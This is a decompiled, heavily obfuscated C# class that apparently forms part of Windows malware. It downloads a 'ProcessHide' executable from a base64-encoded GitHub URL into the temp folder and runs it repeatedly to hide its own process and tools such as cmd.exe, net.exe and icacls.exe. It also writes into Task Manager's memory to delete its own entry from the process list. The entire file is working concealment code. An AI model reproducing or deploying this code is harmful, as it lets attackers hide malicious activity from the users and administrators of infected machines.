using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace nLpTFjJRwUBp;

internal class LsKTTEFrgVj
{
	private struct mCholenWkQYDSM
	{
		public uint jIIoIzrIlgBc;

		public IntPtr QNFliiSFTGWshR;

		public IntPtr NUGJispobbmOcA;

		public uint WtaHeJqqGX;

		public uint KuwyqvSrDSNAECeyM;

		public IntPtr mARWYpJvlP;

		public uint UqABaHCoHPz;

		public int zyYFhgnUsODql;

		public IntPtr EqrdzSGqLAj;
	}

	private const int MqTpZqSQZDbHrKnj = 8;

	private const int EQumcePVXistmr = 16;

	private const int INjFMchhraSs = 32;

	private const int BxehaWJiKJZbycTeH = 0;

	private const int ulcdfOqSOveYUv = 4096;

	private const int SgMHMTHwoHwne = 8192;

	private const int FhAHtKexMSztEE = 16384;

	private const int aznPBHItzVAQt = 32768;

	private const int SXgabkZqBdU = 65536;

	private const int pUIcYLLKmrZ = 131072;

	private const int rAEKRApLoxg = 262144;

	private const int iuDRfASfOLd = 1048576;

	private const int OUXmCpmqikRy = 1;

	private const int CScQIQcGLQxvOhSpm = 2;

	private const int ckjRNMkPPTitAY = 4;

	private const int gUPqhZCiNk = 8;

	private const int mCKPHrMFYpazz = 16;

	private const int VDfJEySQjWGhh = 32;

	private const int KJOllvtXOKkZ = 64;

	private const int LQloJPQsYbqGoZ = 128;

	private const int edjhoPSomeyEpcU = 256;

	private const int mxKMUQoYoPmZjJv = 512;

	private const int sfTmFBPhITVS = 4096;

	private const int JbUFiOTNgpx = 4100;

	private const int wpKLeWmtrahn = 4104;

	private const int UOEgKqbreX = 4141;

	private const int mpuaOFcTagiU = 4142;

	private const int YifRkBgxqwj = 4124;

	private static volatile bool mKUtMrrzxi = false;

	public static volatile bool UVXiTzWoZohl = true;

	public static string PzPdDCIZrZAyY()
	{
		if (IntPtr.Size == 8)
		{
			RLgUMHIwwGSuCLo.DCpLsBJrrzEMg = pfWnilHPEKlpuV(new Uri(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			RLgUMHIwwGSuCLo.DCpLsBJrrzEMg = pfWnilHPEKlpuV(new Uri(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return RLgUMHIwwGSuCLo.DCpLsBJrrzEMg;
	}

	public static string pfWnilHPEKlpuV(Uri IIuZWMmpJK)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(IIuZWMmpJK, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process RGDMyJhUjhj(string KLqhtUyXfyg)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(KLqhtUyXfyg))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void aEQWhdctdSXcLg(string[] sahvuMrECQCTb)
	{
		string text = PzPdDCIZrZAyY();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string kLqhtUyXfyg in sahvuMrECQCTb)
			{
				Process process = RGDMyJhUjhj(kLqhtUyXfyg);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Y29uaG9zdC5leGU="));
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0LmV4ZQ=="));
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("bmV0MS5leGU="));
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("QVJQLkVYRQ=="));
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aWNhY2xzLmV4ZQ=="));
					RLgUMHIwwGSuCLo.oapSGNsteEjKT(text, text2 + " " + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Y21kLmV4ZQ=="));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int suvSrdKlQDHf, bool xuUSzCeuZe, uint HTlULBUGEbPYokfa);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr soDJbepbVnefYYu, IntPtr xzrYdmnTXxpzXU, uint uHPfpZoYFX, int SSwyUAorxqODe, int GiSyXgVgewuLqP);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr hvBYcXIJta, IntPtr csZmJJMtOuxBIb, uint totXRrIfOIdg, int ExTkPBGyTk);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr eilrDHzpctEaF);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr khReAWiUlEsul, IntPtr uHPdPiVNmu, byte[] bUeWLeHnGJMn, uint UfUdXbWgAxA, out UIntPtr QSjVBVOqKVd);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr AHXzjVEhXV, IntPtr NeJQJgdbukUC, [Out] byte[] ZjxfMHXelssYundWG, int krvyyapVBY, out UIntPtr UkEJaNiPrUepE);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr dZNWhekmwYqR, out uint gXTRDYyARjU);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr dfeggwGrQs, uint UIjcJhSpvzPjcAL, IntPtr SKoKnxPwMh, IntPtr LwNqtGaDRijx);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string vigzfvrTPSr, string sdtauxuRVrKaMc);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr MTEdiCMbcVupjdVU, IntPtr jsGVZYcksdelCI, string stiuHPyTeHsgl, string IpaaKMvuqVTNwa);

	private static byte[] VfaRHpTeIPgJiXkl(object iHsDKteqHmjILjL)
	{
		int num = Marshal.SizeOf(iHsDKteqHmjILjL);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(iHsDKteqHmjILjL, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr uuLkuReIXGvyX(uint ZCPfaWOBRHo)
	{
		return OpenProcess(56, xuUSzCeuZe: false, ZCPfaWOBRHo);
	}

	private static void ctWbRzyGXGiS(IntPtr mWtSmbJPgRqiXH)
	{
		CloseHandle(mWtSmbJPgRqiXH);
	}

	private static IntPtr OMPFBVGSfr(uint ZiekJLCvIPJmI, IntPtr vISrPicpgjHZB)
	{
		return VirtualAllocEx(vISrPicpgjHZB, IntPtr.Zero, ZiekJLCvIPJmI, 12288, 4);
	}

	private static void ZXpxgzewYQmp(IntPtr jvRZydlJQNVMQ, IntPtr bPzCvDiHONWfS, uint IzICaVyyepc)
	{
		VirtualFreeEx(jvRZydlJQNVMQ, bPzCvDiHONWfS, IzICaVyyepc, 32768);
	}

	private static IntPtr jERLQxHgctWCJj()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr EZSSgISSojOTWT(IntPtr abmFDqMCfjiu)
	{
		return SendMessage(abmFDqMCfjiu, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void EJMbvpAbasaIX(IntPtr gWqpaNoXedTsdP, IntPtr uOVHEFgqOFyBSvY)
	{
		SendMessage(gWqpaNoXedTsdP, 4104u, uOVHEFgqOFyBSvY, IntPtr.Zero);
	}

	private static void FrHezPEeUALBW(IntPtr MDhrRoVJptotvD)
	{
		SendMessage(MDhrRoVJptotvD, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string MEgSBgmyMB(IntPtr FbLvSmoCTT, IntPtr dJPMvHhVLSPMO)
	{
		byte[] array = new byte[50];
		mCholenWkQYDSM mCholenWkQYDSM = default(mCholenWkQYDSM);
		GetWindowThreadProcessId(FbLvSmoCTT, out var gXTRDYyARjU);
		IntPtr intPtr = uuLkuReIXGvyX(gXTRDYyARjU);
		IntPtr intPtr2 = OMPFBVGSfr((uint)Marshal.SizeOf(mCholenWkQYDSM), intPtr);
		IntPtr intPtr3 = OMPFBVGSfr(50u, intPtr);
		mCholenWkQYDSM.QNFliiSFTGWshR = dJPMvHhVLSPMO;
		mCholenWkQYDSM.NUGJispobbmOcA = (IntPtr)0;
		mCholenWkQYDSM.UqABaHCoHPz = 50u;
		mCholenWkQYDSM.mARWYpJvlP = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, VfaRHpTeIPgJiXkl(mCholenWkQYDSM), (uint)Marshal.SizeOf(mCholenWkQYDSM), out var QSjVBVOqKVd);
		SendMessage(FbLvSmoCTT, 4141u, dJPMvHhVLSPMO, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out QSjVBVOqKVd);
		ZXpxgzewYQmp(intPtr, intPtr2, (uint)Marshal.SizeOf(mCholenWkQYDSM));
		ZXpxgzewYQmp(intPtr, intPtr3, 50u);
		ctWbRzyGXGiS(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void pxlGjKyYdTzWsH(string efjmefPnfL)
	{
		IntPtr intPtr = jERLQxHgctWCJj();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)EZSSgISSojOTWT(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = MEgSBgmyMB(intPtr, (IntPtr)i);
			if (text.Contains(efjmefPnfL))
			{
				EJMbvpAbasaIX(intPtr, (IntPtr)i);
			}
		}
	}

	private static void DtQjZiWTJUfflx()
	{
		IntPtr intPtr = jERLQxHgctWCJj();
		if (intPtr != IntPtr.Zero)
		{
			FrHezPEeUALBW(intPtr);
			FrHezPEeUALBW(intPtr);
			FrHezPEeUALBW(intPtr);
			FrHezPEeUALBW(intPtr);
			FrHezPEeUALBW(intPtr);
		}
	}

	public static void NVeVVUzCJkbK()
	{
		Thread thread = new Thread(ZkEegxeGvMCgX);
		thread.Start();
	}

	public static void PKrHVgABzN()
	{
		mKUtMrrzxi = true;
	}

	private static void ZkEegxeGvMCgX()
	{
		while (!mKUtMrrzxi)
		{
			if (UVXiTzWoZohl)
			{
				pxlGjKyYdTzWsH(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				DtQjZiWTJUfflx();
				Thread.Sleep(1000);
			}
		}
		mKUtMrrzxi = false;
	}
}
